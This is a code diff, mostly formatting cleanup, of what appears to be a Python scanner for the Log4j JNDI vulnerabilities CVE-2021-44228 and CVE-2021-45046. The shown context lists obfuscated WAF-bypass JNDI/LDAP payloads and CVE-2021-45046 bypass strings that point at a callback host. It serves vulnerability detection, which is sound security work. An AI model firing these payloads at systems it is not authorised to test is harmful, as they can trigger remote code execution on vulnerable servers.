@@ -16,7 +16,6 @@ import sys
 from urllib import parse as urlparse
 import base64
 import json
-import random
 from uuid import uuid4
 from base64 import b64encode
 from Crypto.Cipher import AES, PKCS1_OAEP
@@ -74,13 +73,13 @@ waf_bypass_payloads = ["${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{
                        "${jndi:${lower:l}${lower:d}a${lower:p}://{{callback_host}}}",
                        "${jnd${upper:i}:ldap://{{callback_host}}/{{random}}}",
                        "${j${${:-l}${:-o}${:-w}${:-e}${:-r}:n}di:ldap://{{callback_host}}/{{random}}}"
-                      ]
+                       ]
 
 cve_2021_45046 = [
-                  "${jndi:ldap://127.0.0.1#{{callback_host}}:1389/{{random}}}", # Source: https://twitter.com/marcioalm/status/1471740771581652995,
+                  "${jndi:ldap://127.0.0.1#{{callback_host}}:1389/{{random}}}",  # Source: https://twitter.com/marcioalm/status/1471740771581652995,
                   "${jndi:ldap://127.0.0.1#{{callback_host}}/{{random}}}",
                   "${jndi:ldap://127.1.1.1#{{callback_host}}/{{random}}}"
-                 ]  
+                 ]
 
 parser = argparse.ArgumentParser()
 parser.add_argument("-u", "--url",
@@ -188,6 +187,7 @@ def generate_waf_bypass_payloads(callback_host, random_string):
         payloads.append(new_payload)
     return payloads
 
+
 def get_cve_2021_45046_payloads(callback_host, random_string):
     payloads = []
     for i in cve_2021_45046:
@@ -195,6 +195,7 @@ def get_cve_2021_45046_payloads(callback_host, random_string):
         new_payload = new_payload.replace("{{random}}", random_string)
         payloads.append(new_payload)
     return payloads
+
 
 class Dnslog(object):
     def __init__(self):
@@ -308,7 +309,7 @@ def scan_url(url, callback_host):
     payloads = [payload]
     if args.waf_bypass_payloads:
         payloads.extend(generate_waf_bypass_payloads(f'{parsed_url["host"]}.{callback_host}', random_string))
-    
+
     if args.cve_2021_45046:
         cprint(f"[•] Scanning for CVE-2021-45046 (Log4j v2.15.0 Patch Bypass - RCE)", "yellow")
         payloads = get_cve_2021_45046_payloads(f'{parsed_url["host"]}.{callback_host}', random_string)
@@ -374,7 +375,7 @@ def main():
     dns_callback_host = ""
     if args.custom_dns_callback_host:
         cprint(f"[•] Using custom DNS Callback host [{args.custom_dns_callback_host}]. No verification will be done after sending fuzz requests.")
-        dns_callback_host =  args.custom_dns_callback_host
+        dns_callback_host = args.custom_dns_callback_host
     else:
         cprint(f"[•] Initiating DNS callback server ({args.dns_callback_provider}).")
         if args.dns_callback_provider == "interact.sh":
